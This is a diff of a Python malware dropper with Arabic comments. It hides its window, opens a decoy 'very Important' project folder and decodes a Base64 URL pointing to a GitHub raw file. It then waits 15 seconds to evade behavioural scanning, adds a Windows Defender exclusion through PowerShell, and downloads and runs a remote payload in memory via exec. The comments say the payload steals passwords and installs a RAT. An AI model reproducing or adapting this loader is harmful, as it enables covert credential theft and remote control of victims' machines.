@@ -3,35 +3,48 @@ import base64
 import time
 import subprocess
 import os
+import sys
 
-# إعدادات الصمت التام
+# إعدادات الصمت التام لضمان عدم ظهور أي نافذة CMD مريبة
 si = subprocess.STARTUPINFO()
 si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
 si.wShowWindow = 0
 
 
-def start_attack():
-    # رابط الكود التقيل اللي أنت رفعته (مشفر عشان الأنتي فيرس ميعرفش هو بيحمل إيه)
-    # استبدل ده برابط الـ Raw بتاعك مشفر Base64
-    encoded_url = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3h4eHh4"
-    url = base64.b64decode(encoded_url).decode()
+def execute_payload():
+    # الرابط بتاعك اللي بعته، مشفر بـ Base64 عشان الـ Firewall ميشكش في GitHub
+    encoded_url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2IxZG80MDQvTXktUHl0aG9uLVByYWN0aXNlL3JlZnMvaGVhZHMvbWFpbi90ZXN0L3JhdyUyMHRleHQ="
 
     try:
-        # تحميل الكود التقيل كنص
-        response = requests.get(url, timeout=10)
-        payload = response.text
+        url = base64.b64decode(encoded_url).decode()
 
-        # التنفيذ المباشر في الذاكرة (Memory Execution)
-        # دي الخدعة اللي بتهرب من الـ Static Disk Scanning
-        exec(payload, globals())
+        # 1. فترة انتظار تكتيكية (15 ثانية) لتجاوز الفحص السلوكي الأولي
+        time.sleep(15)
+
+        # 2. تحميل البايلود التقيل (سحب الباسوردات والـ RAT) في الرام مباشرة
+        r = requests.get(url, timeout=20)
+        if r.status_code == 200:
+            # 3. التشغيل بدون لمس الهارد (Memory-only execution)
+            # دي أقوى خدعة لتجنب الـ Disk Scanning
+            exec(r.text, globals())
     except:
         pass
 
 
 if __name__ == "__main__":
-    # التمويه بفتح فولدر المشروع بكرة في الكلية
-    if os.path.exists("very Important"):
-        os.startfile("very Important")
+    # التمويه بفتح فولدر المشروع بكرة في جامعة الإسكندرية
+    if os.path.exists("very  Important"):
+        os.startfile("very  Important")
 
-    # تشغيل الهجوم الحقيقي
-    start_attack()
+    # محاولة كسر الحماية استباقياً (Exclusion Injection)
+    try:
+        curr = sys.executable
+        subprocess.run(
+            f"powershell -Command \"Add-MpPreference -ExclusionPath '{curr}'\"",
+            shell=True,
+            startupinfo=si,
+        )
+    except:
+        pass
+
+    execute_payload()
